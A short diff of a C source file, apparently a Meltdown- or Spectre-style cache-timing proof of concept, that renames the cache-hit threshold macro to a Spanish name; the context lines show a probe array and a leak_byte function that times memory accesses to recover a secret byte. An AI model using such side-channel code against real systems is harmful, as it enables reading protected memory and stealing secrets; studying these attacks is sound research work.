@@ -6,7 +6,7 @@
 #include <unistd.h>
 
 #define PROBE_SIZE 256 * 4096
-#define CACHE_HIT_THRESHOLD 80
+#define CACHE_HIT_LIMITE 80
 
 uint8_t probe_array[PROBE_SIZE];
 jmp_buf buf;
@@ -51,7 +51,7 @@ uint8_t leak_byte(uint8_t *secret) {
         int mix_i = ((i * 167) + 13) & 255; // Mezclar el orden
         uint64_t t = time_access(&probe_array[mix_i * 4096]);
 
-        if (t < CACHE_HIT_THRESHOLD) {
+        if (t < CACHE_HIT_LIMITE) {
             return (uint8_t)mix_i;
         }
     }
